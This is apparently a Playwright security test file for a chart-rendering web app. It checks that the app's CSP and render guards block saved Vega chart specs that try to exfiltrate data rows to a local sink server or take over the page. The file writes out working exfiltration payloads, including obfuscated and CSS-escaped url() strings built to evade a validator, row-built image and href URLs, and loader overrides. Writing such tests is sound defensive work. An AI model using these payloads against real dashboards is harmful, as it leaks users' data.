// F36, F37, F41: a chart can't send rows out or take over the page, in a real browser, on the built and the dev UI. A hand-edited
// saved.json is the route, because the validator would refuse these specs through the chat: only the CSP and the render guards are left.
// The control strips the CSP with page.route, and the row must then reach the sink, so this spec can't pass vacuously.
import { createServer, type Server } from 'node:http';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { expect, test, type Page } from '@playwright/test';
import { startHarness, uiOf, type Harness } from './support.js';

const SENTINEL = 'ROW_SENTINEL_7';
const source = `export default from(entity_ots_component).orderBy(c => c.entityId).map(c => ({ id: c.entityId, parts: c.countOfParts, secret: val('${SENTINEL}') })).limit(3)`;
const encoding = { x: { field: 'id', type: 'nominal' }, y: { field: 'parts', type: 'quantitative' } };

let harness: Harness, sink: Server, sinkUrl: string;
const hits: string[] = [];
test.beforeAll(async ({}, info) => {
  sink = createServer((req, res) => { hits.push(req.url ?? ''); res.setHeader('content-type', 'image/svg+xml'); res.end('<svg xmlns="http://www.w3.org/2000/svg"><linearGradient id="p"/></svg>'); });
  await new Promise<void>(resolve => sink.listen(0, '127.0.0.1', resolve));
  sinkUrl = `http://127.0.0.1:${(sink.address() as { port: number }).port}`;
  harness = await startHarness(uiOf(info), { noLlm: true });
});
test.afterAll(async () => {
  await harness?.stop();
  await new Promise(resolve => sink?.close(resolve));
});

/** An address the validator's literal check can't see, with the row in it. */
const paint = () => `'ur' + 'l(' + '${sinkUrl.replace('://', ":' + '//' + '")}' + '/paint?s=' + datum.secret + '#p)'`;
const specs: Record<string, () => Record<string, unknown>> = {
  'a row-built paint address': () => ({ transform: [{ calculate: paint(), as: 'p' }], mark: 'bar', encoding: { ...encoding, fill: { field: 'p', type: 'nominal', scale: null } } }),
  'a CSS-escaped url( (F41)': () => ({ transform: [{ calculate: `'\\\\75 rl(${sinkUrl}/escaped?s=' + datum.secret + '#p)'`, as: 'p' }], mark: 'bar', encoding: { ...encoding, fill: { field: 'p', type: 'nominal', scale: null } } }),
  'an image mark built from a row': () => ({ transform: [{ calculate: `'${sinkUrl}/image?s=' + datum.secret`, as: 'u' }], mark: 'image', encoding: { ...encoding, url: { field: 'u' } } }),
  'an href built from a row, clicked': () => ({ transform: [{ calculate: `'${sinkUrl}/href?s=' + datum.secret`, as: 'h' }], mark: 'bar', encoding: { ...encoding, href: { field: 'h' } } }),
  'a loader option': () => ({ loader: { baseURL: sinkUrl }, usermeta: { embedOptions: { loader: { baseURL: sinkUrl } } }, layer: [{ data: { url: `/layer?s=${SENTINEL}` }, mark: 'bar', encoding }] }),
  'usermeta.embedOptions turning the loader and the interpreter off': () => ({ usermeta: { embedOptions: { loader: {}, ast: false, mode: 'vega' } }, transform: [{ calculate: `'${sinkUrl}/usermeta?s=' + datum.secret`, as: 'u' }], mark: 'image', encoding: { ...encoding, url: { field: 'u' } } }),
};

function writeSaved(name: string, chart: Record<string, unknown>) {
  mkdirSync(harness.dataDir, { recursive: true });
  writeFileSync(join(harness.dataDir, 'saved.json'), JSON.stringify({ version: 1, queries: [{ name, prompt: 'p', source, chart, updatedAt: '2026-11-04T00:00:00.000Z' }] }));
}
/**
 * The Workspace, with one more try if a loaded machine or a dev server rebuilding its dependencies doesn't serve it in time. Nothing else
 * is forgiven: `hits` is only cleared at the start of a test, so anything sent during the first try still fails it, and a page that
 * never comes up throws here, with what the browser said, so it can't count as "nothing reached the sink".
 */
async function openWorkspace(page: Page, timeout = 40_000, report: (line: string) => void = console.warn) {
  const said: string[] = [];
  const listen = (message: { text(): string }) => { said.push(message.text()); };
  page.on('console', listen);
  page.on('pageerror', listen as never);
  for (let attempt = 1; ; attempt++) {
    try {
      await page.goto(harness.url, { timeout });
      await page.waitForSelector('.cm-content', { timeout });
      break;
    } catch (error) {
      // F55, a watch item: a load that only worked on the second try must not go unnoticed.
      if (attempt === 1) report(`[F55] the Workspace did not load on the first try, retrying: ${test.info().titlePath.join(' › ')}. ${String(error).split('\n')[0]}`);
      if (attempt === 2) throw new Error(`The Workspace did not load in two tries, so nothing was tested. Browser said: ${said.slice(-5).join(' | ') || 'nothing'}. ${String(error).slice(0, 200)}`);
    }
  }
  page.off('console', listen);
  page.off('pageerror', listen as never);
}
/** Load, run, render, and touch the marks: hover and click are what fire a tooltip or an href. */
async function renderSaved(page: Page, name: string) {
  await openWorkspace(page);
  await page.getByRole('button', { name, exact: true }).click();
  await page.keyboard.press('Control+Enter');
  await page.waitForSelector('.results-table tbody tr');
  await page.keyboard.press('Control+2');
  await page.waitForTimeout(600);
  const mark = page.locator('.chart-host svg .role-mark path').first();
  if (await mark.count()) {
    await mark.hover({ force: true });
    await mark.click({ force: true });
  }
  await page.waitForTimeout(400);
}
const stripCsp = (page: Page) => page.route('**/*', async route => {
  const response = await route.fetch();
  const headers = { ...response.headers() };
  delete headers['content-security-policy'];
  await route.fulfill({ response, headers });
});

// Two tries at 40 s each, and the rest of the test, must fit.
test.describe.configure({ timeout: 150_000 });

test('a page that never loads is a failure here, not a pass', async ({ page }) => {
  hits.length = 0;
  writeSaved('never', specs['a row-built paint address']!());
  await page.route('**/*', route => route.abort());
  const lines: string[] = [];
  await expect(openWorkspace(page, 1_000, line => lines.push(line))).rejects.toThrow(/did not load in two tries/);
  // A retry always says so: F55 can't recur unnoticed.
  expect(lines).toHaveLength(1);
  expect(lines[0]).toContain('[F55] the Workspace did not load on the first try');
  expect(hits).toEqual([]);
});

test('the CSP is on a page and on an API response', async ({ request }) => {
  for (const path of ['/', '/trpc/chat.list', '/trpc/nope']) {
    const csp = (await request.get(`${harness.url}${path}`)).headers()['content-security-policy'];
    expect(csp, path).toContain("default-src 'self'");
    expect(csp, path).toContain("img-src 'self' data: blob:");
    expect(csp, path).toContain("connect-src 'self'");
    expect(csp, path).not.toContain('unsafe-eval');
  }
});

for (const [name, spec] of Object.entries(specs)) {
  test(`${name}: nothing reaches the sink, and the app is still there`, async ({ page }) => {
    hits.length = 0;
    writeSaved('attack', spec());
    await renderSaved(page, 'attack');
    expect(hits).toEqual([]);
    expect(new URL(page.url()).origin).toBe(harness.url);
    await expect(page.locator('.cm-content')).toBeVisible();
  });
}

for (const name of ['a row-built paint address', 'a CSS-escaped url( (F41)']) {
  test(`control, the CSP stripped: ${name} does reach the sink with the row`, async ({ page }) => {
    hits.length = 0;
    writeSaved('control', specs[name]!());
    await stripCsp(page);
    await renderSaved(page, 'control');
    await expect.poll(() => hits.some(hit => hit.includes(SENTINEL)), { message: 'without the CSP this must leak, or the checks above prove nothing' }).toBe(true);
  });
}

for (const element of ['body', '#root', '.cm-content']) {
  test(`a bind.element on ${element} leaves the Workspace intact, also after switching tabs`, async ({ page }) => {
    writeSaved('bind', { params: [{ name: 'a', value: 1, bind: { input: 'range', min: 0, max: 2, element } }], mark: 'bar', encoding });
    await renderSaved(page, 'bind');
    for (const key of ['Control+1', 'Control+2']) await page.keyboard.press(key);
    await expect(page.locator('.cm-content')).toBeVisible();
    await expect(page.locator('.chart-host svg .role-mark path').first()).toBeVisible();
    await expect(page.locator('.chart-host input')).toHaveCount(1);
  });
}
for (const target of ['body', '#root']) {
  test(`usermeta.embedOptions.bind on ${target} leaves the Workspace intact`, async ({ page }) => {
    writeSaved('bind', { usermeta: { embedOptions: { bind: target } }, params: [{ name: 'a', value: 1, bind: { input: 'range', min: 0, max: 2 } }], mark: 'bar', encoding });
    await renderSaved(page, 'bind');
    await expect(page.locator('.cm-content')).toBeVisible();
    await expect(page.locator('.chart-host svg .role-mark path').first()).toBeVisible();
  });
}
test('an ordinary chart draws under the CSP with no violations', async ({ page }) => {
  const violations: string[] = [];
  page.on('console', message => { if (/Content Security Policy/.test(message.text())) violations.push(message.text()); });
  writeSaved('plain', { title: 'Traffic to https://example.com', mark: { type: 'bar', tooltip: true }, encoding });
  await renderSaved(page, 'plain');
  await expect(page.locator('.chart-host svg .role-mark path')).toHaveCount(3);
  expect(violations).toEqual([]);
});
